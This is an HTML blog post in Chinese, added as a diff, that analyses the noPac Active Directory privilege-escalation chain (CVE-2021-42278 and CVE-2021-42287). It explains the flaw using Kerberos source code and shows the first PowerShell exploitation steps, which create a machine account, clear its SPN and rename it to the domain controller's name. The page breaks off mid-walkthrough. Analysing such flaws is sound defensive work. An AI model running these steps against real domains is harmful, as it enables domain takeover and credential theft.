@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>noPac 分析 - TryA9ain-Blog</title><meta name="author" content="TryA9ain">
+<meta name="author-link" content="">
+<meta name="description" content="本文主要记录了通过 WireShark 解开 Kerberos 协议对 noPac 漏洞进行详细分析." /><meta name="keywords" content='域渗透' /><meta itemprop="name" content="noPac 分析">
+<meta itemprop="description" content="本文主要记录了通过 WireShark 解开 Kerberos 协议对 noPac 漏洞进行详细分析."><meta itemprop="datePublished" content="2022-11-25T17:37:22+08:00" />
+<meta itemprop="dateModified" content="2022-11-25T17:37:22+08:00" />
+<meta itemprop="wordCount" content="2323">
+<meta itemprop="keywords" content="域渗透," /><meta property="og:title" content="noPac 分析" />
+<meta property="og:description" content="本文主要记录了通过 WireShark 解开 Kerberos 协议对 noPac 漏洞进行详细分析." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://TryA9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-25T17:37:22+08:00" />
+<meta property="article:modified_time" content="2022-11-25T17:37:22+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="noPac 分析"/>
+<meta name="twitter:description" content="本文主要记录了通过 WireShark 解开 Kerberos 协议对 noPac 漏洞进行详细分析."/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://TryA9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://TryA9ain.github.io/posts/kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" /><link rel="next" href="https://TryA9ain.github.io/posts/%E5%88%A9%E7%94%A8-keytab-%E5%92%8C-wireshark-%E8%A7%A3%E5%AF%86-kerberos/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "noPac 分析",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/TryA9ain.github.io\/posts\/nopac-%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "域渗透","wordcount":  2323 ,
+    "url": "https:\/\/TryA9ain.github.io\/posts\/nopac-%E5%88%86%E6%9E%90\/","datePublished": "2022-11-25T17:37:22+08:00","dateModified": "2022-11-25T17:37:22+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "TryA9ain"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="TryA9ain-Blog"><span class="header-title-text">TryA9ain</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="TryA9ain-Blog"><span class="header-title-text">TryA9ain</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>noPac 分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/logo.jpeg" srcset="/images/logo.jpeg, /images/logo.jpeg 1.5x, /images/logo.jpeg 2x" sizes="auto" data-title="TryA9ain" data-alt="TryA9ain" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;TryA9ain</span></span>
+          <span class="post-category">收录于 <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 域渗透相关知识</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2022-11-25 17:37:22"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2022-11-25">2022-11-25</time></span>&nbsp;<span title="更新于 2022-11-25 17:37:22"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2022-11-25">2022-11-25</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2323 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 5 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞简介">漏洞简介</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#samaccountname">sAMAccountName</a></li>
+    <li><a href="#cve-2021-42278---samaccountname-spoofing">CVE-2021-42278 - sAMAccountName spoofing</a></li>
+    <li><a href="#cve-2021-42287---kdc-bamboozling">CVE-2021-42287 - KDC bamboozling</a></li>
+    <li><a href="#利用过程">利用过程</a>
+      <ul>
+        <li><a href="#新增计算机帐户">新增计算机帐户</a></li>
+        <li><a href="#清除新增的计算机帐户的-spn">清除新增的计算机帐户的 SPN</a></li>
+        <li><a href="#更改计算机帐户的-samaccountname">更改计算机帐户的 sAMAccountName</a></li>
+        <li><a href="#使用创建的计算机帐户申请-tgt">使用创建的计算机帐户申请 TGT</a></li>
+        <li><a href="#恢复计算机帐户的-samaccountname">恢复计算机帐户的 sAMAccountName</a></li>
+        <li><a href="#获取-st">获取 ST</a></li>
+        <li><a href="#dcsync">DCSync</a></li>
+      </ul>
+    </li>
+    <li><a href="#wireshark-分析">WireShark 分析</a>
+      <ul>
+        <li><a href="#as-req">AS-REQ</a></li>
+        <li><a href="#as-rep">AS-REP</a></li>
+        <li><a href="#tgs-req">TGS-REQ</a></li>
+        <li><a href="#tgs-rep">TGS-REP</a></li>
+      </ul>
+    </li>
+    <li><a href="#工具">工具</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>本文主要记录了通过 WireShark 解开 Kerberos 协议对 noPac 漏洞进行详细分析.</p>
+<h2 id="漏洞简介">漏洞简介</h2>
+<p>noPac 其实是两个漏洞的组合利用:</p>
+<ol>
+<li>
+<p>首先利用了 CVE-2021-42278 漏洞, 这个漏洞使用 sAMAccountName 欺骗冒充域控.</p>
+</li>
+<li>
+<p>接着利用了 CVE-2021-42287 漏洞, 这个漏洞主要是会在查找不到用户时在其 sAMAccountName 结尾加入 $ 继续查询.</p>
+</li>
+</ol>
+<h2 id="漏洞原理">漏洞原理</h2>
+<ol>
+<li>
+<p>创建计算机帐户,  清除创建的计算机帐户的 SPN (servicePrincipalName).</p>
+</li>
+<li>
+<p>将创建的计算机帐户的 sAMAccountName 更改为域控的主机名,  注意后面不带 $ 符号 (如: DC) &mdash;&gt; CVE-2021-42278.</p>
+</li>
+<li>
+<p>为创建的计算机帐户申请 TGT.</p>
+</li>
+<li>
+<p>恢复创建的计算机帐户的 sAMAccountName 值 (随便命名均可).</p>
+</li>
+<li>
+<p>使用创建的计算机帐户获取到的 TGT 向域控发起 S4U2Self 请求 ST &mdash;&gt; CVE-2021-42287.</p>
+</li>
+<li>
+<p>使用获取到的 ST 进行 DCSync 攻击等 &hellip;</p>
+</li>
+</ol>
+<h2 id="samaccountname">sAMAccountName</h2>
+<p>在域中每一个用户即是一个对象, 每个对象都具有各种各样的属性, 其中就包括姓名, 创建时间, 邮箱地址等关于这个用户的信息, 而每个域用户的用户名对应的属性值便为 userPrincipalName 和 sAMAccountName.</p>
+<p>那为什么是两个呢？因为在 Windows 2000 之前使用的是 sAMAccountName, 在 Windows 2000 之后出现了新的属性 UserPrincipalName (UPN), 它也可以用来登录到域内主机, 这两个现在都可以作为登录用户名使用.</p>
+<p>我们可以连接 ldap 进行查看域用户 wangxiaohong 的 sAMAccountName 值为 wangxiaohong, 平时常使用 “域名\用户名” 的格式来登录, UserPrincipalName 值为 wangxiaohong@missyou.com 为 “用户名@域名” 的格式.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220914150055.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150055.png, images/Pasted%20image%2020220914150055.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150055.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150055.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150055.png" width="2546" height="1146" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="cve-2021-42278---samaccountname-spoofing">CVE-2021-42278 - sAMAccountName spoofing</h2>
+<p>为了区分用户帐户和计算机帐户, 计算机帐户应在其 sAMAccountName 属性中以 $ 结尾. 但 Active Directory 并未对计算机帐户 sAMAccountName 属性进行验证.</p>
+<p>在默认设置下以及未打补丁时, 普通用户最多能创建 10 个计算机帐户, 作为其所有者, 用户也有权编辑其创建的计算机帐户的 sAMAccountName 属性.</p>
+<p>域用户 ligang 的 sAMAccountName 为 ligang.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220914151001.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151001.png, images/Pasted%20image%2020220914151001.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151001.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151001.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151001.png" width="2514" height="1104" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>计算机帐户 win-2008r2-2 的 sAMAccountName 为 WIN-2008r2-2$.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220914151119.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151119.png, images/Pasted%20image%2020220914151119.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151119.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151119.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914151119.png" width="2516" height="1068" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h2 id="cve-2021-42287---kdc-bamboozling">CVE-2021-42287 - KDC bamboozling</h2>
+<p>这个漏洞主要是欺骗 KDC.</p>
+<p>使用 Kerberos 执行身份验证时, 会从密钥分发中心 (KDC) 请求 TGT 和 ST, 如果为无法找到的帐户请求 ST, KDC 将尝在其 sAMAccountName 结尾添加 $ 再次搜索.</p>
+<p>例如:
+如果有一个 sAMAccountName 为 DC$ 的域控, 攻击者创建一个新的计算机帐户并将其 sAMAccountName 重命名为 DC, 请求 TGT, 之后恢复创建的计算机帐户的 sAMAccountName, 并使用请求到的 TGT 去请求一个 ST, 在处理 ST 请求时, KDC 将无法查找到计算机帐户 DC, 因此, KDC 将在其结尾处添加 $ (此时就变成了域控计算机帐户 DC$) 进行另一次查找, 查找将成功, 因此, KDC 将使用 DC$ 的权限签发 ST.</p>
+<p>这里需要用到 <a href="https://trya9ain.github.io/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/#s4u2self"target="_blank" rel="external nofollow noopener noreferrer">S4U2Self</a> 和 <a href="https://trya9ain.github.io/kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/#pac"target="_blank" rel="external nofollow noopener noreferrer">PAC</a> 的相关知识, 建议先了解再来跟进 noPac 漏洞.</p>
+<p>从 XP 源码看相关函数如下:</p>
+<p>可以看到, 当找不到用户时, 系统并不会直接提示找不到帐户, 而是会在其后面添加 $ 符号, 将其作为计算机帐户再次查找.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">Status</span> <span class="o">=</span> <span class="n">SamIGetUserLogonInformation2</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">               <span class="n">GlobalAccountDomainHandle</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="n">LookupFlags</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="n">UserName</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="n">WhichFields</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="n">ExtendedFields</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="o">&amp;</span><span class="n">UserInfo</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="o">&amp;</span><span class="n">LocalMembership</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">               <span class="o">&amp;</span><span class="n">LocalUserHandle</span>
+</span></span><span class="line"><span class="cl">               <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// WASBUG: For now,  if we couldn&#39;t find the account try again
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// with a &#39;$&#39; at the end (if there wasn&#39;t one already)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(((</span><span class="n">Status</span> <span class="o">==</span> <span class="n">STATUS_NOT_FOUND</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="n">Status</span> <span class="o">==</span> <span class="n">STATUS_NO_SUCH_USER</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">!</span><span class="n">IsValidGuid</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">((</span><span class="n">LookupFlags</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">SAM_NO_MEMBERSHIPS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">&gt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">[</span><span class="n">UserName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sa">L</span><span class="sc">&#39;$&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">   <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Status</span> <span class="o">=</span> <span class="n">KerbDuplicateString</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                  <span class="o">&amp;</span><span class="n">TempString</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="n">UserName</span>
+</span></span><span class="line"><span class="cl">                  <span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">KerbErr</span> <span class="o">=</span> <span class="n">KRB_ERR_GENERIC</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">Cleanup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">DsysAssert</span><span class="p">(</span><span class="n">TempString</span><span class="p">.</span><span class="n">MaximumLength</span> <span class="o">&gt;=</span> <span class="n">TempString</span><span class="p">.</span><span class="n">Length</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">TempString</span><span class="p">.</span><span class="n">Buffer</span><span class="p">[</span><span class="n">TempString</span><span class="p">.</span><span class="n">Length</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">)]</span> <span class="o">=</span> <span class="sa">L</span><span class="sc">&#39;$&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">TempString</span><span class="p">.</span><span class="n">Length</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">D_DebugLog</span><span class="p">((</span><span class="n">DEB_TRACE</span><span class="p">,</span>  <span class="s">&#34;Account not found , trying 计算机帐户 %wZ</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">TempString</span> <span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">Status</span> <span class="o">=</span> <span class="n">SamIGetUserLogonInformation2</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">GlobalAccountDomainHandle</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="n">LookupFlags</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="o">&amp;</span><span class="n">TempString</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="n">WhichFields</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="n">ExtendedFields</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="o">&amp;</span><span class="n">UserInfo</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="o">&amp;</span><span class="n">LocalMembership</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                  <span class="o">&amp;</span><span class="n">LocalUserHandle</span>
+</span></span><span class="line"><span class="cl">                  <span class="p">);</span>
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>
+</span></span></code></pre></div><h2 id="利用过程">利用过程</h2>
+<h3 id="新增计算机帐户">新增计算机帐户</h3>
+<p>利用 Powermad.ps1 新增计算机帐户.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="s2">&#34;test1a&#34;</span> <span class="n">-Domain</span> <span class="s2">&#34;missyou.com&#34;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915102254.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915102254.png, images/Pasted%20image%2020220915102254.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915102254.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915102254.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915102254.png" width="1282" height="230" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="清除新增的计算机帐户的-spn">清除新增的计算机帐户的 SPN</h3>
+<blockquote>
+<p>如果是通过 Impacket 中的 addcomputer.py 添加的计算机帐户默认不会包含SPN, 所以可省略清除 SPN 的步骤.</p>
+</blockquote>
+<p>利用 PowerView.ps1 清除新增的计算机帐户的 SPN.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="s2">&#34;CN=test1a, CN=Computers, DC=missyou, DC=com&#34;</span> <span class="n">-Clear</span> <span class="s1">&#39;servicePrincipalName&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220915103132.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915103132.png, images/Pasted%20image%2020220915103132.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915103132.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915103132.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220915103132.png" width="1284" height="480" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>当计算机帐户创建时便默认携带了 SPN, 如果修改了 sAMAccountName, dNSHostName 或 msDS-AdditionalsAMAccountName 其中的一个, 那么 SPN 将会使用新值替换. 要是修改了 sAMAccountName 为域控的主机名, 那么其 SPN 将会变成域控的 SPN, Kerberos 身份验证使用它来将服务实例与服务登录帐户相关联, <a href="https://docs.microsoft.com/zh-cn/windows/win32/ad/name-formats-for-unique-spns"target="_blank" rel="external nofollow noopener noreferrer">SPN 在注册它的林中必须是唯一的. 如果它不唯一, 身份验证将失败</a>, 域控也不会处理这样的请求, 会报错: 使用 “0” 个参数调用 “SetInfo” 时发生异常: “该服务器不愿意处理该请求.”</p>
+<p>但如果 SPN 在设置 sAMAccountName, dNSHostName 或 msDS-AdditionalsAMAccountName 属性之前已被删除, 那么 SPN 列表将不会更新, 除非再次给 servicePrincipalName 字段赋值. 所以在修改 sAMAccountName 前删除其 SPN 属性.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220914150627.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150627.png, images/Pasted%20image%2020220914150627.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150627.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150627.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914150627.png" width="912" height="718" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220914163214.png" srcset="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914163214.png, images/Pasted%20image%2020220914163214.png 1.5x, /posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914163214.png 2x" sizes="auto" data-title="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914163214.png" data-alt="/posts/nopac-%E5%88%86%E6%9E%90/images/Pasted%20image%2020220914163214.png" width="1278" height="348" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="更改计算机帐户的-samaccountname">更改计算机帐户的 sAMAccountName</h3>
+<p>利用 Powermad.ps1 更改创建的计算机帐户的 sAMAccountName 为域控的主机名, 注意这里不带 $.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-MachineAccountAttribute</span> <span class="n">-MachineAccount</span> <span class="s2">&#34;test1a&#34;</span> <span class="n">-Value</span> <span class="s2">&#34;DC&#34;</span> <span class="n">-Attribute</span> <span class="s1">&#39;sAMAccountName&#39;</span> <span class="n">-DomainController</span> <span class="s2">&#34;DC.missyou.com&#34;</span> <span class="n">-Verbose</span>
